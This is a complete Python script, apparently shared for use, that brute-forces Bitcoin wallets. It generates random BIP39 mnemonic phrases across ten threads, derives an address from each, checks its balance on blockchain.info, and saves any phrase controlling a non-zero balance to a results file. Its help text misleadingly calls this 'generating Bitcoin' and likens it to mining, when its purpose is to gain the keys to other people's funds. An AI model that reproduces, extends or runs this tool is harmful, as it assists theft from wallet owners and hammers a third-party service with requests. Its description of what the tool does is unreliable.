import mnemonic
import bip32utils
import requests
import random
import os
from decimal import Decimal
from multiprocessing.pool import ThreadPool as Pool
import threading
from Bip39Gen import Bip39Gen
from time import sleep
from urllib.request import urlopen
import re

def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)


def userInput():
    while True:
            start()


def getInternet():
    try:
        try:
            requests.get('http://216.58.192.142')#google.cock
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


lock = threading.Lock()

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass


def getBalance(address):

    blockchain_tags_json = [ 
        'total_received',
        'final_balance',
        ]

    SATOSHIS_PER_BTC = 1e+8

    check_address = address

    parse_address_structure = re.match(r' *([a-zA-Z1-9]{1,34})', check_address)
    if ( parse_address_structure is not None ):
        check_address = parse_address_structure.group(1)
    else:
        print( "\nThis Bitcoin Address is invalid" + check_address )
        return Decimal(0.)

    #Read info from Blockchain about the Address
    reading_state=1
    while (reading_state):
        try:
            htmlfile = urlopen("https://blockchain.info/address/%s?format=json" % check_address, timeout = 10)
            htmltext = htmlfile.read().decode('utf-8')
            reading_state  = 0
        except:
            reading_state+=1
            print( "Checking... " + str(reading_state) )
            sleep(60*reading_state)

    blockchain_info_array = []
    tag = ''
    try:
        for tag in blockchain_tags_json:
            blockchain_info_array.append (
                float( re.search( r'%s":(\d+),' % tag, htmltext ).group(1) ) )
    except:
        print( "Error '%s'." % tag )
        exit(1)
        
    return Decimal(float(blockchain_info_array[0]))
      



def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
            random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(44 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def check():
    while True:
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        balance = getBalance(addy)
        with lock:
            print(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}')
        if balance > 0:
            with open('results/wet.txt', 'a') as w:
                w.write(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')


def helpText():
    print("""
This program was made by Anarb and it generates Bitcoin by searching multiple possible
wallet combinations until it's finds one with over 0 BTC and saves it into
a file called "wet.txt" in the results folder.
It's recommended to leave this running for a long time to get the best resaults, It's doesn't use up
that much resources so you can leave it in the background in the chance of you hitting a jackpot.
It's like mining but with less resources

Modyfied by: 
@billyel telegram

        """)


def start():
    threads = 10
    if getInternet() == True:
        pool = Pool(threads)
        for _ in range(threads):
            pool.apply_async(check, ())
        pool.close()
        pool.join()
    else:
        print("Told ya")
        userInput()


if __name__ == '__main__':
    makeDir()
    getInternet()
    if getInternet() == False:
        print("You have no internet access the generator won't work.")
    else:
        pass
    userInput()
